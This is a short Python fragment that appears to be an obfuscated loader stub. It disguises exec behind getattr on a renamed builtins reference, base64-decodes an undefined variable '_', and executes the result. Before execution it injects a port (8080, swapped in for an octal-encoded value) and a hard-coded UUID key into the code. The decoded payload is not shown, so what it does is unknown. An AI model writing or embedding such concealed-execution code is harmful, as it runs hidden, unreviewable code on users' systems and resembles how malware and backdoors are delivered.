import sys
from base64 import b64decode

sys.__std__ = __builtins__
__builtins__.getattr(sys.__std__, "exec")(
    b64decode(_).decode("utf8").replace(str(int("0o17620", 8)), str(8080))
    .replace("__key__", "23356947-05c7-4b71-8a8d-83c0d4f63918")
    .replace("__vl__", "")
    .replace("__vm__", "")
    .replace("__tr__", "")
)